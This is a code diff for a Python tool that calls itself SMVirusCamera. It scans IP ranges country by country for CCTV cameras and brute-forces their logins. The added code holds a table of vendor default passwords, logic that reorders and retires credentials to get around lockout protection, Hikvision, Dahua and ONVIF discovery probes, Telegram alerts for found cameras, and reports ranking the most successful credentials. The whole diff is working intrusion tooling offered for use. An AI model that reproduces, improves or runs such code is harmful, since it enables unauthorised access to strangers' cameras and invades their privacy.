@@ -14,7 +14,8 @@ import os
 import struct
 import re
 from typing import Optional, Tuple, List
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import (ThreadPoolExecutor, as_completed,
+                                 wait as _cf_wait, FIRST_COMPLETED as _CF_FIRST_COMPLETED)
 import threading
 import queue
 import requests
@@ -686,6 +687,9 @@ _cli_output_path: str = ''
 # CLI scan timeout (seconds) — controls per-connection socket timeout in fast_port_scan
 _cli_scan_timeout: float = 0.15
 
+# Anti-freeze: if no future completes within this many seconds, skip hanging IPs
+_SCAN_STALL_TIMEOUT: int = 90   # seconds to wait before declaring a stall
+
 # CLI credentials file override — empty = use default credentials.txt / built-ins
 _cli_credentials_file: str = ''
 
@@ -753,6 +757,61 @@ country_blacklist: set = set()   # set of 2-letter ISO codes
 
 # Persistent scan history log
 SCAN_SUMMARY_FILE = os.path.join(SCRIPT_DIR, "scan_summary.log")
+
+# ── Session wall-clock timer (set at process startup) ─────────────────────────
+_SESSION_START_TIME: float = time.time()
+
+# ── MASTER_INDEX + CHANGELOG paths ────────────────────────────────────────────
+_MASTER_INDEX_FILE = os.path.join(SCRIPT_DIR, 'MASTER_INDEX.txt')
+_CHANGELOG_FILE    = os.path.join(SCRIPT_DIR, 'CHANGELOG.txt')
+
+# ── Live found-camera mini-log (rolling last-5 for ticker display) ─────────────
+_live_found_mini_log: list = []   # list of short camera strings
+_mini_log_lock = threading.Lock()
+
+# ── Credential session hit/try tracking (live rate display + auto-retire) ──────
+_cred_session_hits:  dict = {}   # "user:pass" -> int success count this session
+_cred_session_tries: dict = {}   # "user:pass" -> int attempt count
+_cred_retired_set:   set  = set()  # credentials retired for 0 hits after threshold
+_cred_hits_lock = threading.Lock()
+_CRED_RETIRE_AFTER = 500   # retire a credential after this many attempts with 0 hits
+
+# ── Model-specific default credentials (tried first for known camera types) ───
+# Keys are lowercase substrings matched against the detected camera_type label.
+MODEL_DEFAULT_CREDS: dict = {
+    'hikvision': [('admin','12345'),('admin','admin'),('admin','Admin12345'),('admin','')],
+    'hik':       [('admin','12345'),('admin','admin'),('admin','Admin12345'),('admin','')],
+    'dahua':     [('admin','admin'),('admin','admin123'),('666666','666666'),('888888','888888')],
+    'anjhua':    [('admin','admin'),('admin','admin123'),('666666','666666'),('888888','888888')],
+    'reolink':   [('admin',''),('admin','123456'),('admin','reolink')],
+    'foscam':    [('admin',''),('admin','admin'),('user','user')],
+    'axis':      [('root',''),('admin','admin'),('root','pass')],
+    'hanwha':    [('admin','admin4321'),('admin','admin'),('admin','4321')],
+    'amcrest':   [('admin','admin'),('admin','admin123'),('admin','')],
+    'uniview':   [('admin','123456'),('admin','Admin123'),('admin','')],
+    'reolink':   [('admin',''),('admin','123456')],
+    'tp-link':   [('admin','admin'),('admin',''),('admin','tplink')],
+    'wyze':      [('admin','admin'),('admin','wyze')],
+}
+
+# ── Lockout cooldown timestamp (for indicator in live progress bar) ────────────
+_lockout_cooldown_ts: float = 0.0
+_lockout_cd_lock = threading.Lock()
+
+# ── Quick-scan mode (--quick: only 4 most common ports) ───────────────────────
+_quick_scan_mode: bool = False
+_QUICK_PORTS = [80, 554, 8080, 37777]
+
+# ── Counter-only lock (scanned_count increments — separate from results_lock) ──
+_counter_lock = threading.Lock()
+
+# ── Auto-tuned worker count from startup silent benchmark ──────────────────────
+_auto_tuned_workers: int = 0   # 0 = not yet benchmarked
+
+# ── Credential de-ranking on lockout signals ───────────────────────────────────
+_lockout_derank_counts: dict = {}  # "user:pass" -> consecutive lockout count
+_lockout_derank_lock = threading.Lock()
+_DERANK_LOCKOUT_THRESHOLD = 3   # after this many lockout-inducing auth failures, push to end
 
 # ══════════════════════════════════════════════════════════════════════════════
 # ── SMV Feature Pack ───────────────────────────────────────────────────────────
@@ -3093,6 +3152,38 @@ def send_telegram_message(message: str):
     except queue.Full:
         pass
 
+def send_telegram_message_with_keyboard(message: str, buttons: list) -> None:
+    """Blocking: send a message with an inline keyboard to all destinations.
+    buttons is a list of rows; each row is a list of (label, callback_data) tuples.
+    Example: buttons = [[('⏸ Pause', 'cmd_pause'), ('⏹ Stop', 'cmd_stop')]]
+    Silently does nothing if Telegram is not configured."""
+    if not TELEGRAM_CONFIG.get("enabled"):
+        return
+    destinations = TELEGRAM_CONFIG.get("destinations", [])
+    inline_keyboard = [
+        [{"text": lbl, "callback_data": cbd} for lbl, cbd in row]
+        for row in buttons
+    ]
+    reply_markup = {"inline_keyboard": inline_keyboard}
+    for dest in destinations:
+        _tok = dest.get("bot_token", "")
+        _cid = dest.get("chat_id", "")
+        if not _tok or not _cid:
+            continue
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{_tok}/sendMessage",
+                json={
+                    "chat_id": _cid,
+                    "text": message,
+                    "parse_mode": "HTML",
+                    "reply_markup": reply_markup,
+                },
+                timeout=8,
+            )
+        except Exception:
+            pass
+
 def send_telegram_camera_detection(ip, camera_type, port, model="", country_name="", country_code=""):
     """Batch camera detections to reduce Telegram API spam.
     Groups multiple detections into single messages."""
@@ -4836,6 +4927,35 @@ def ip_range_to_list(start_ip: str, end_ip: str) -> List[str]:
         return []
 
 
+def _iter_with_timeout(futures_map: dict, timeout: int = 90):
+    """
+    Drop-in replacement for ``as_completed(futures_map)`` that has a hard
+    stall timeout.  When no future completes within *timeout* seconds, every
+    remaining future is cancelled, a warning is printed, and the generator
+    stops — so the outer for-loop exits cleanly instead of blocking forever.
+
+    This fixes the freeze bug where a thread hangs inside a socket call that
+    lacks an explicit timeout (e.g. old kernel TCP keep-alive state).
+    ``socket.setdefaulttimeout(12)`` is set at startup as a companion guard,
+    but this generator provides a second, coarser safety net at the scan level.
+    """
+    _pending = set(futures_map.keys())
+    while _pending:
+        _done, _pending = _cf_wait(_pending, timeout=timeout,
+                                    return_when=_CF_FIRST_COMPLETED)
+        if not _done:
+            _n = len(_pending)
+            for _f in list(_pending):
+                _f.cancel()
+            sys.stdout.write(
+                f'\r\033[K{Fore.YELLOW}[!] Scan stall: {_n} futures frozen '
+                f'>{timeout}s with no progress — cancelling and continuing'
+                f'{Style.RESET_ALL}\n')
+            sys.stdout.flush()
+            return   # stop the generator cleanly; outer for-loop ends
+        yield from _done
+
+
 def fast_port_scan(ip: str,
                    ports: List[int],
                    timeout: float = None) -> List[int]:
@@ -5107,6 +5227,24 @@ def detect_camera_via_http(ip: str, port: int = 80) -> Tuple[bool, str]:
     Also extracts device model from Server header and stores in global dict
     """
     global device_models
+    # ── Port 8000: Hikvision SDK binary probe (before HTTP) ──────────────────
+    if port == 8000:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _sk8:
+                _sk8.settimeout(1.5)
+                _sk8.connect((ip, 8000))
+                # Hikvision SDK v2.0 handshake magic: 32-byte header
+                _hik_magic = b'\x00\x00\x00\x20' + b'\x01\x00\x00\x00' + b'\x00' * 24
+                _sk8.sendall(_hik_magic)
+                _hik_resp = _sk8.recv(64)
+                if _hik_resp and len(_hik_resp) >= 4:
+                    # Positive response: starts with 0x00 0x00 0x00 0x20 or contains HIK marker
+                    if _hik_resp[:4] == b'\x00\x00\x00\x20' or b'HIK' in _hik_resp or b'hik' in _hik_resp.lower():
+                        with results_lock:
+                            device_models[ip] = 'Hikvision-SDK-8000'
+                        return True, "HIK Vision Camera"
+        except Exception:
+            pass
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.settimeout(_cli_scan_timeout)
@@ -5637,6 +5775,29 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
             sys.stdout.flush()
 
         open_ports = fast_port_scan(ip, ports)
+        # ── UDP discovery: Dahua SDK (37020) and WS-Discovery (3702) ─────────
+        try:
+            import socket as _sock_ud
+            _UDP_PROBES = {
+                37020: bytes([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
+                3702:  b'<?xml version="1.0"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"><e:Body/></e:Envelope>',
+            }
+            for _uport, _uprobe in _UDP_PROBES.items():
+                if _uport not in open_ports:
+                    try:
+                        _us = _sock_ud.socket(_sock_ud.AF_INET, _sock_ud.SOCK_DGRAM)
+                        _us.settimeout(0.4)
+                        _us.sendto(_uprobe, (ip, _uport))
+                        _resp, _ = _us.recvfrom(256)
+                        if _resp:
+                            open_ports = list(open_ports) + [_uport]
+                        _us.close()
+                    except Exception:
+                        try: _us.close()
+                        except: pass
+        except Exception:
+            pass
         if _cli_verbose and open_ports:
             print(f"\n{Fore.CYAN}[SCAN] {ip} → open: {', '.join(str(p) for p in open_ports)}{Style.RESET_ALL}")
         if not open_ports:
@@ -5663,6 +5824,9 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
         if not camera_found:
             if detected_port in (37777, 37778, 37779):
                 camera_type = "Anjhua-Dahua Technology Camera"
+                camera_found = True
+            elif 3702 in open_ports and not camera_found:
+                camera_type = "ONVIF Camera (WS-Discovery)"
                 camera_found = True
 
         if camera_found and camera_type and camera_type != "Unknown Camera" and camera_type not in [
@@ -5700,6 +5864,10 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
             _dc   = device_color(camera_type)
             _flag = country_flag(country_code)
             print(f"\n{_dc}[✓] {Fore.YELLOW}{_flag} [{country_name} ({country_code})]{Style.RESET_ALL}{_dc} Camera Found! {camera_type} | {ip}:{detected_port} | 📷 #{_cams_now}{Style.RESET_ALL}")
+            with _mini_log_lock:
+                _live_found_mini_log.append(f"{camera_type[:18]}@{ip}:{detected_port}")
+                if len(_live_found_mini_log) > 5:
+                    _live_found_mini_log.pop(0)
 
             send_telegram_camera_detection(ip, camera_type, detected_port, model, country_name, country_code)
 
@@ -5809,6 +5977,10 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                 print(f"    Port: {detected_port}")
                 print(f"    URL: {url}")
                 print(f"    Detection Time: {detection_time}")
+                with _mini_log_lock:
+                    _live_found_mini_log.append(f"{camera_type[:18]}@{ip}:{detected_port}")
+                    if len(_live_found_mini_log) > 5:
+                        _live_found_mini_log.pop(0)
 
                 send_telegram_camera_detection(ip, camera_type, detected_port, model, country_name, country_code)
             else:
@@ -5836,7 +6008,40 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                 if ip not in lockout_tracker:
                     lockout_tracker[ip] = 0
 
+            # ── Passive banner grab — refine camera_type from Server header ────
+            if not camera_type or camera_type in ('Unknown Camera', 'Unknown', ''):
+                try:
+                    import urllib.request as _ureq_bg
+                    _bg_conn = _ureq_bg.urlopen(
+                        f"http://{ip}:{detected_port}", timeout=1.5)
+                    _bg_svr  = _bg_conn.getheader('Server', '') or ''
+                    _bg_auth = _bg_conn.getheader('WWW-Authenticate', '') or ''
+                    _bg_conn.close()
+                    _bg_hint = (_bg_svr + ' ' + _bg_auth).lower()
+                    if 'hikvision' in _bg_hint:
+                        camera_type = 'Hikvision Camera'
+                    elif 'dahua' in _bg_hint or 'anjhua' in _bg_hint:
+                        camera_type = 'Anjhua-Dahua Technology Camera'
+                    elif 'axis' in _bg_hint:
+                        camera_type = 'Axis Camera'
+                    elif 'reolink' in _bg_hint:
+                        camera_type = 'Reolink Camera'
+                    elif 'foscam' in _bg_hint:
+                        camera_type = 'Foscam Camera'
+                except Exception:
+                    pass
+
             for username, password in credentials:
+                # ── Auto-retire credentials with 0 hits after threshold ────────
+                with _cred_hits_lock:
+                    _cck = f"{username}:{password}"
+                    if _cck in _cred_retired_set:
+                        continue
+                    _cred_session_tries[_cck] = _cred_session_tries.get(_cck, 0) + 1
+                    if (_cred_session_tries.get(_cck, 0) >= _CRED_RETIRE_AFTER
+                            and _cred_session_hits.get(_cck, 0) == 0):
+                        _cred_retired_set.add(_cck)
+                        continue
                 if _cli_verbose:
                     print(f"{Fore.YELLOW}[TRY]  {ip}:{detected_port}  {username}:{password}{Style.RESET_ALL}")
                 # Smart Lockout Protection: cooldown after too many failed attempts
@@ -5847,6 +6052,17 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                         do_cooldown = True
                         lockout_tracker[ip] = 0
                 if do_cooldown:
+                    with _lockout_cd_lock:
+                        _lockout_cooldown_ts = time.time()
+                    # ── De-rank the credential that triggered this lockout ────
+                    _ldr_key = f"{username}:{password}"
+                    with _lockout_derank_lock:
+                        _lockout_derank_counts[_ldr_key] = _lockout_derank_counts.get(_ldr_key, 0) + 1
+                        if _lockout_derank_counts[_ldr_key] >= _DERANK_LOCKOUT_THRESHOLD:
+                            # Move this credential to the end of the session list
+                            credentials = [(u, p) for u, p in credentials
+                                           if not (u == username and p == password)]
+                            credentials.append((username, password))
                     print(f"\n{Fore.YELLOW}[!] IP COOLDOWN ACTIVE: {ip} — pausing {COOLDOWN_SECONDS}s before retry (Country: {country_info}){Style.RESET_ALL}")
                     sys.stdout.flush()
                     if TELEGRAM_CONFIG.get("enabled"):
@@ -5906,6 +6122,9 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                             f"{Fore.GREEN}[✓] LOGIN SUCCESS! Username: {username}, Password: {password}{Style.RESET_ALL}\n"
                         )
                         record_credential_success(username, password)
+                        with _cred_hits_lock:
+                            _ck = f"{username}:{password}"
+                            _cred_session_hits[_ck] = _cred_session_hits.get(_ck, 0) + 1
                         try:
                             generate_qr_code(
                                 f"http://{ip}:{detected_port}",
@@ -6027,6 +6246,9 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                             f"{Fore.GREEN}[✓] LOGIN SUCCESS! Username: {username}, Password: {password}{Style.RESET_ALL}\n"
                         )
                         record_credential_success(username, password)
+                        with _cred_hits_lock:
+                            _ck = f"{username}:{password}"
+                            _cred_session_hits[_ck] = _cred_session_hits.get(_ck, 0) + 1
                         try:
                             generate_qr_code(
                                 f"http://{ip}:{detected_port}",
@@ -6147,6 +6369,9 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                             f"{Fore.GREEN}[✓] LOGIN SUCCESS! Username: {username}, Password: {password}{Style.RESET_ALL}\n"
                         )
                         record_credential_success(username, password)
+                        with _cred_hits_lock:
+                            _ck = f"{username}:{password}"
+                            _cred_session_hits[_ck] = _cred_session_hits.get(_ck, 0) + 1
                         try:
                             generate_qr_code(
                                 f"http://{ip}:{detected_port}",
@@ -6251,6 +6476,9 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                             })
                         print(f"{Fore.GREEN}[✓] LOGIN SUCCESS (Generic)! {username}:{password}{Style.RESET_ALL}\n")
                         record_credential_success(username, password)
+                        with _cred_hits_lock:
+                            _ck = f"{username}:{password}"
+                            _cred_session_hits[_ck] = _cred_session_hits.get(_ck, 0) + 1
                         try:
                             generate_qr_code(
                                 f"http://{ip}:{detected_port}",
@@ -6514,6 +6742,177 @@ def calculate_optimal_workers(mode: str = 'scan') -> int:
     return w
 
 
+def generate_daily_report(output_path: str, html: bool = False) -> bool:
+    """
+    Generate a 24-hour scan report and write it to output_path.
+    Returns True on success, False on failure.
+    Callable programmatically (does NOT call sys.exit).
+    """
+    import datetime as _dt_gdr
+    _now    = _dt_gdr.datetime.now()
+    _cutoff = _now - _dt_gdr.timedelta(hours=24)
+    _now_s  = _now.strftime('%Y-%m-%d %H:%M:%S')
+    _win_s  = _cutoff.strftime('%Y-%m-%d %H:%M')
+
+    def _pval(s):
+        idx = s.find(':')
+        return s[idx + 1:].strip() if idx >= 0 else s.strip()
+
+    _scans = []
+    if os.path.exists(SCAN_SUMMARY_FILE):
+        try:
+            with open(SCAN_SUMMARY_FILE, 'r', encoding='utf-8') as _f:
+                for _ln in _f:
+                    _ln = _ln.strip()
+                    if not _ln: continue
+                    _pts = [p.strip() for p in _ln.split('|')]
+                    if len(_pts) < 7: continue
+                    try:
+                        _scan_dt = _dt_gdr.datetime.strptime(_pts[0], '%Y-%m-%d %H:%M')
+                        if _scan_dt < _cutoff: continue
+                        _scans.append({
+                            'ts':      _pts[0],
+                            'code':    _pts[1].strip(),
+                            'name':    _pts[2].strip(),
+                            'cameras': int(_pval(_pts[3])),
+                            'logins':  int(_pval(_pts[4])),
+                            'top':     _pval(_pts[5]),
+                            'dur':     _pval(_pts[6]),
+                            'mode':    _pval(_pts[7]) if len(_pts) > 7 else 'full',
+                        })
+                    except Exception: continue
+        except Exception: pass
+
+    _cred = {}
+    _today_s = _now.strftime('%Y-%m-%d')
+    _yest_s  = (_now - _dt_gdr.timedelta(days=1)).strftime('%Y-%m-%d')
+    if os.path.exists(CRED_DAILY_FILE):
+        try:
+            with open(CRED_DAILY_FILE, 'r', encoding='utf-8') as _cf:
+                _raw = json.load(_cf)
+            for _dd, _dc in _raw.items():
+                if _dd in (_today_s, _yest_s):
+                    for _k, _v in _dc.items():
+                        _cred[_k] = _cred.get(_k, 0) + _v
+        except Exception: pass
+
+    _tot_cam  = sum(s['cameras'] for s in _scans)
+    _tot_log  = sum(s['logins']  for s in _scans)
+    _rate     = (_tot_log / _tot_cam * 100) if _tot_cam > 0 else 0.0
+    _top_cred = sorted(_cred.items(), key=lambda x: x[1], reverse=True)[:10]
+    _max_hits = _top_cred[0][1] if _top_cred else 1
+
+    _lines = [
+        '═' * 78,
+        '  SMVirusCamera — Daily Scan Report',
+        f'  Generated : {_now_s}',
+        f'  Window    : last 24 hours  (since {_win_s})',
+        '═' * 78, '',
+        '  OVERVIEW', f"  {'─'*74}",
+        f'  Countries scanned    : {len(_scans)}',
+        f'  Total cameras found  : {_tot_cam:,}',
+        f'  Successful logins    : {_tot_log:,}',
+        f'  Overall success rate : {_rate:.1f}%', '',
+        f'  PER-COUNTRY BREAKDOWN  ({len(_scans)} scan{"s" if len(_scans)!=1 else ""})',
+        f"  {'─'*74}",
+        f"  {'Country':<28} {'CC':<5} {'Cameras':>8} {'Logins':>7} {'Rate':>6}  {'Top Credential':<26} Duration",
+        f"  {'─'*74}",
+    ]
+    if _scans:
+        for _s in _scans:
+            _r = f"{(_s['logins']/_s['cameras']*100):.1f}%" if _s['cameras'] > 0 else '0.0%'
+            _lines.append(
+                f"  {_s['name'][:28]:<28} {_s['code']:<5} {_s['cameras']:>8,} "
+                f"{_s['logins']:>7,} {_r:>6}  {_s['top'][:24]:<26} {_s['dur']}")
+    else:
+        _lines.append('  No scans recorded in the past 24 hours.')
+    _lines += [
+        '', '  TOP CREDENTIALS  (past 24 h)', f"  {'─'*74}",
+    ]
+    if _top_cred:
+        for _i, (_k, _v) in enumerate(_top_cred, 1):
+            _dp = _k.split(':', 1)
+            _bar = '█' * max(1, int(_v / _max_hits * 24))
+            _lines.append(f'  #{_i:<4} {_dp[0]:<20} {(_dp[1] if len(_dp)>1 else ""):<22} {_v:>5} hits  {_bar}')
+    else:
+        _lines.append('  No per-day credential data yet.')
+    _lines += ['', '═' * 78, f'  Generated by SMVirusCamera  |  {_now_s}', '═' * 78]
+    _text = '\n'.join(_lines)
+
+    try:
+        with open(output_path, 'w', encoding='utf-8') as _out:
+            _out.write(_text)
+        return True
+    except Exception:
+        return False
+
+
+def run_silent_benchmark() -> int:
+    """
+    Quick 20-probe network benchmark to auto-tune thread count.
+    Runs silently at startup; result stored in _auto_tuned_workers.
+    Returns recommended worker count (0 = benchmark failed/skipped).
+    """
+    global _auto_tuned_workers
+    import random as _rbm, socket as _sbm, statistics as _stbm
+    from concurrent.futures import ThreadPoolExecutor as _TPEBM
+    _PROBE_N   = 20
+    _PROBE_P   = 80
+    _PROBE_TO  = 1.2
+    _BLOCKS    = ['1.','8.','5.','9.','23.','31.','37.','45.','54.','62.','67.',
+                  '78.','80.','91.','103.','113.','122.','130.','139.','149.']
+    _rnd = _rbm.Random()
+    _ips = [f"{b}{_rnd.randint(1,254)}.{_rnd.randint(1,254)}" for b in (_BLOCKS * 2)[:_PROBE_N]]
+    def _probe(ip):
+        t0 = __import__('time').time()
+        try:
+            s = _sbm.create_connection((ip, _PROBE_P), timeout=_PROBE_TO)
+            s.close()
+            return ('ok', __import__('time').time() - t0)
+        except OSError:
+            return ('fail', __import__('time').time() - t0)
+    try:
+        with _TPEBM(max_workers=_PROBE_N) as _ex:
+            _results = list(_ex.map(_probe, _ips))
+    except Exception:
+        return 0
+    _lats = [t for _, t in _results if t < _PROBE_TO * 0.95]
+    _tmo_rate = sum(1 for s, _ in _results if s == 'fail') / len(_results) if _results else 1.0
+    if not _lats:
+        _p90 = 1500.0
+    else:
+        _sorted = sorted(_lats)
+        _p90 = _sorted[int(len(_sorted) * 0.9)] * 1000
+    if _p90 < 120:   _rec = 300
+    elif _p90 < 250: _rec = 200
+    elif _p90 < 500: _rec = 120
+    elif _p90 < 900: _rec = 75
+    else:            _rec = 40
+    if _tmo_rate > 0.65:
+        _rec = max(20, _rec // 2)
+    _auto_tuned_workers = _rec
+    return _rec
+
+
+def _load_already_found_ips(country_code: str) -> set:
+    """Load IPs already saved in the country's CCTV_Found file to skip re-scanning."""
+    _found = set()
+    _cc_file = os.path.join(SCRIPT_DIR, f"{country_code}_CCTV_Found.txt")
+    if not os.path.exists(_cc_file):
+        return _found
+    try:
+        import re as _re_aff
+        _ip_pat = _re_aff.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
+        with open(_cc_file, 'r', encoding='utf-8', errors='replace') as _f:
+            for _ln in _f:
+                _m = _ip_pat.search(_ln)
+                if _m:
+                    _found.add(_m.group(1))
+    except Exception:
+        pass
+    return _found
+
+
 def scan_ip_range(start_ip: str,
                   end_ip: str,
                   credentials: List[Tuple[str, str]],
@@ -6544,6 +6943,8 @@ def scan_ip_range(start_ip: str,
         return
 
     ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    if _quick_scan_mode:
+        ports_to_scan = _QUICK_PORTS
 
     if max_workers is None:
         max_workers = calculate_optimal_workers('scan')
@@ -6562,9 +6963,48 @@ def scan_ip_range(start_ip: str,
     with _range_active_lock:
         _range_active_start = start_ip
         _range_active_end   = end_ip
-    _ir_last_bar = 0.0
     mascot_react('scanning', f"Scanning {total_ips} IPs with {max_workers} threads...")
     start_scan_dashboard(15)
+
+    # ── Background progress-ticker thread ────────────────────────────────────
+    # Prints the ⚡ line every 2 s so the bar stays live even when all worker
+    # threads are blocked waiting for network timeouts (can be 40+ s each).
+    _ir_tick = {
+        'sc': 0, 'found': 0, 'total': total_ips,
+        'st': start_time, 'w': max_workers, 'last': [],
+    }
+    _ir_tick_ev = threading.Event()
+
+    def _ir_ticker():
+        while not _ir_tick_ev.wait(2.0):
+            try:
+                # Read globals directly so bar stays live even when all threads
+                # are blocked on timeouts and as_completed never fires.
+                _sc  = scanned_count; _fd = len(valid_results)
+                _tot = _ir_tick['total']; _el = time.time() - _ir_tick['st']
+                _mw  = _ir_tick['w']
+                _pct   = int(_sc * 100 / _tot) if _tot else 0
+                _spd   = _sc / _el if _el > 0 else 0
+                _eta_s = int((_tot - _sc) / _spd) if _spd > 0 else 0
+                _eta   = (f"{_eta_s//3600}h {(_eta_s%3600)//60}m" if _eta_s >= 3600
+                          else f"{_eta_s//60}m {_eta_s%60}s" if _eta_s >= 60
+                          else f"{_eta_s}s" if _eta_s > 0 else "calculating...")
+                _fill  = int(20 * _sc / _tot) if _tot else 0
+                _bar   = '█' * _fill + '░' * (20 - _fill)
+                _ir_last_str = (f" | 📡 {_ir_tick['last'][-1]}"
+                               if _ir_tick.get('last') else "")
+                sys.stdout.write(
+                    f"\r\033[K{Fore.CYAN}⚡ [{_bar}] {_pct}% | "
+                    f"{_sc:,}/{_tot:,} IPs | 📷 {_fd} found | "
+                    f"{_spd:.0f} IP/s | ETA {_eta} | "
+                    f"Threads {_mw}{_ir_last_str}{Style.RESET_ALL}"
+                )
+                sys.stdout.flush()
+            except Exception:
+                pass
+
+    _ir_tick_ev.clear()
+    threading.Thread(target=_ir_ticker, daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         future_to_ip = {}
@@ -6577,46 +7017,39 @@ def scan_ip_range(start_ip: str,
                     time.sleep(2 ** _retry * 0.5)
             # silently skip the IP if all retries failed (OS still thread-starved)
 
-        for future in as_completed(future_to_ip):
+        # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
+        for future in _iter_with_timeout(future_to_ip, _SCAN_STALL_TIMEOUT):
             ip = future_to_ip[future]
             try:
-                result = future.result()
+                result = future.result(timeout=5)
                 with results_lock:
                     scanned_count += 1
                 if result:
                     with results_lock:
                         valid_results.append(result)
+                    _ir_tick['last'] = (_ir_tick['last'] + [
+                        f"{result['ip']}:{result['port']}"
+                    ])[-3:]
                     _cam_count = len(valid_results)
-                    print(f"\n{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL} "
+                    sys.stdout.write('\r\033[K')  # clear ticker line before printing
+                    sys.stdout.flush()
+                    print(f"{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL} "
                           f"{result['ip']}:{result['port']} — "
                           f"{result['camera_type']} | "
                           f"{result['username']}:{result['password']}")
 
-                _ir_now = time.time()
-                if _ir_now - _ir_last_bar >= 8.0 or scanned_count >= total_ips:
-                    _ir_last_bar = _ir_now
-                    _ir_el = _ir_now - start_time
-                    _ir_sc = scanned_count
-                    _ir_pct = int(_ir_sc * 100 / total_ips) if total_ips else 0
-                    _ir_spd = _ir_sc / _ir_el if _ir_el > 0 else 0
-                    _ir_eta_s = int((total_ips - _ir_sc) / _ir_spd) if _ir_spd > 0 else 0
-                    _ir_eta = (f"{_ir_eta_s//3600}h {(_ir_eta_s%3600)//60}m" if _ir_eta_s >= 3600
-                               else f"{_ir_eta_s//60}m {_ir_eta_s%60}s" if _ir_eta_s >= 60
-                               else f"{_ir_eta_s}s")
-                    _ir_fill = int(20 * _ir_sc / total_ips) if total_ips else 0
-                    _ir_bar  = '█' * _ir_fill + '░' * (20 - _ir_fill)
-                    sys.stdout.write(
-                        f"\r\033[K{Fore.CYAN}⚡ [{_ir_bar}] {_ir_pct}% | "
-                        f"{_ir_sc:,}/{total_ips:,} IPs | "
-                        f"📷 {len(valid_results)} found | "
-                        f"{_ir_spd:.0f} IP/s | "
-                        f"ETA {_ir_eta} | "
-                        f"Threads {max_workers}{Style.RESET_ALL}"
-                    )
-                    sys.stdout.flush()
+                # Keep the ticker thread in sync so it shows accurate numbers
+                _ir_tick['sc']    = scanned_count
+                _ir_tick['found'] = len(valid_results)
+                _ir_tick['w']     = max_workers
 
             except Exception:
-                pass
+                with results_lock:
+                    scanned_count += 1
+
+    # Stop the background progress ticker before printing final stats
+    _ir_tick_ev.set()
+    print()  # move past the \r progress line
 
     stop_scan_dashboard()
 
@@ -6670,9 +7103,18 @@ def print_country_menu():
                     _n   = f"{_num:>3s}."                      # "  5." — 4 chars
                     _cc  = f"{_ctry['code']:<{_CODE_W}}"       # "TR"   — 2 chars
                     _nm  = f"{_ctry['name'][:_NAME_W]:<{_NAME_W}}"  # padded — 20 chars
+                    # Color-code countries with existing result files
+                    _has_results = any(
+                        os.path.exists(os.path.join(SCRIPT_DIR, f))
+                        for f in os.listdir(SCRIPT_DIR)
+                        if _ctry['code'] in f and ('CCTV_Found' in f or 'ValidCamera' in f)
+                    ) if os.path.isdir(SCRIPT_DIR) else False
+                    _code_color = Fore.GREEN + Style.BRIGHT if _has_results else G
+                    _star       = f"{Fore.GREEN}★{W} " if _has_results else "  "
                     # Assemble: color only wraps plain strings, never padded ones
                     _line += (f"{Y}{_n}{W} "                   # num+dot, 1 space
-                              f"{G}{_cc}{W}  "                 # code, 2 spaces
+                              f"{_code_color}{_cc}{W}"         # code
+                              f"{_star}"                       # star if has results
                               f"{_nm}  ")                      # name, 2 spaces gap
                 else:
                     _line += " " * _CELL_W
@@ -7015,9 +7457,31 @@ def scan_country_cameras(country: dict,
 
     total_ips = ip_count
     ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    if _quick_scan_mode:
+        ports_to_scan = _QUICK_PORTS
 
     if max_workers is None:
-        max_workers = calculate_optimal_workers('scan')
+        if _auto_tuned_workers > 0:
+            max_workers = _auto_tuned_workers
+            print(f"{Fore.CYAN}[*] Using auto-tuned thread count: {max_workers}{Style.RESET_ALL}")
+        else:
+            max_workers = calculate_optimal_workers('scan')
+
+    # ── Skip already-found IPs from existing CCTV_Found file ─────────────
+    _already_found_ips = _load_already_found_ips(country['code'])
+    if _already_found_ips:
+        print(f"{Fore.YELLOW}[*] Skipping {len(_already_found_ips):,} already-found IPs from {country['code']}_CCTV_Found.txt{Style.RESET_ALL}")
+
+    # ── --dry-run: print resolved config then exit ─────────────────────────
+    if '--dry-run' in sys.argv:
+        print(f"\n{Fore.CYAN}[DRY-RUN] Would scan:{Style.RESET_ALL}")
+        print(f"  Country  : {country['name']} ({country['code']})")
+        print(f"  IPs      : {total_ips:,} (skip {len(_already_found_ips):,} already found)")
+        print(f"  Ports    : {ports_to_scan}")
+        print(f"  Threads  : {max_workers}")
+        print(f"  Creds    : {len(credentials)}")
+        print(f"  Output   : {cctv_output_file}")
+        return
 
     # ── Resume check ────────────────────────────────────────────────────────
     resume_range_idx = 0
@@ -7133,6 +7597,92 @@ def scan_country_cameras(country: dict,
